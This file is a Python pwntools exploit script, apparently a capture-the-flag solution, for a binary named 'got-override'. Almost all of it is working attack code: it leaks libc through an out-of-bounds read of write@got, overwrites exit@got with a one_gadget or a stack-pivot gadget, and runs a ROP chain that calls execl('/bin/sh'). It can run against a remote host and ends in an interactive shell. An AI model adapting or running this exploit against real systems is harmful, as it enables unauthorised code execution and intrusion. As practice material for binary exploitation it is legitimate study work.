#!/usr/bin/python
from pwn import *
import os

os.chdir('../public')

elf = context.binary = ELF("got-override", checksec=False)
libc = elf.libc
context.terminal = ['kitty', '@', 'launch', '--cwd', 'current', '--location', 'hsplit', '--title', 'DEBUG']
gs = '''
init-pwndbg
b *0x401360
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

# Safelinking functions [https://github.com/mdulin2/mangle/]
def protect_ptr(target, addr):
	return (addr >> 12) ^ target

def reveal_ptr(mangled_ptr, addr):
	return protect_ptr(mangled_ptr, addr)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def logbase(): log.info(f'Libc base: {libc.address:#x}')

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)

r= run()

# =-=- leak Libc ---

# Calculate distance of write.got from data[] and read from there
write_idx = elf.got.write - elf.sym.data
sla(b'option: ', b'2')
sla(b'from: ', str(write_idx).encode()) # leak write@got

# get leak
rl()
libc.address = u64(r.recv(8)) - libc.sym.write
logbase()

# Calculate distance of exit@got from data[] and write there
exit_idx = elf.got.exit - elf.sym.data

# Overwrite GOT with one-gadget
if args.ONEGADGET:    
    log.info('Exploiting with One Gadget')
    og = one_gadget(elf.libc.path, libc.address)
    
    sla(b'option: ', b'1')
    sla(b'data: ', p64(og[2]))
    sla(b'data to: ', str(exit_idx).encode())  # overwrite exit@got

    sla(b'option: ', b'3')  # exit and hijack control flow
else:
    log.info('Exploiting with ROP chain and stack pivot')
    # Put rop chain in data[]
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.execl(next(libc.search(b'/bin/sh\x00')))  # fuck system
    sla(b'option: ', b'1')
    sla(b'data: ', rop.chain())
    sla(b'data to: ', b'0')
    
    # overwrite exit@got with stack pivot gadget
    # and pivot stack to data where rop chain is
    rop = ROP(libc)
    rop.raw(libc.address + 0x3c2c2)
    rop.raw(0xdeadbeef)
    rop.rsp = elf.sym.data
    sla(b'option: ', b'1')
    sla(b'data: ', rop.chain())
    sla(b'data to: ', str(exit_idx).encode())  
    
    sla(b'option: ', b'3')  # exit and hijack control flow

# ====================================
r.interactive()
